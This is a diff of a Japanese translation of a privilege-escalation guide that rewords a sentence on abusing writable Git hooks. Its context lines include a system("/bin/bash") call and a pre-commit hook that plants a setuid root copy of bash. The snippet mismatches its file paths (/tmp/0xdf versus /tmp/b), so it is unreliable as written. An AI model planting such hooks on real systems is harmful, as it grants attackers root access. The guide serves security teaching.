@@ -26,7 +26,7 @@ system("/bin/bash");
 
 [**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) は、コミットが作成されるときやマージなど、git リポジトリ内のさまざまな **イベント** で **実行される** **スクリプト** です。したがって、**特権スクリプトまたはユーザー** がこれらのアクションを頻繁に実行し、`.git` フォルダーに **書き込む** ことが可能であれば、これを **privesc** に利用できます。
 
-たとえば、git リポジトリ内の **`.git/hooks`** に **スクリプトを生成** することが可能であり、新しいコミットが作成されるたびに常に実行されます：
+たとえば、git リポジトリの **`.git/hooks`** に **スクリプト** を **生成** することが可能であり、新しいコミットが作成されるたびに常に実行されます：
 ```bash
 echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
 chmod +x pre-commit
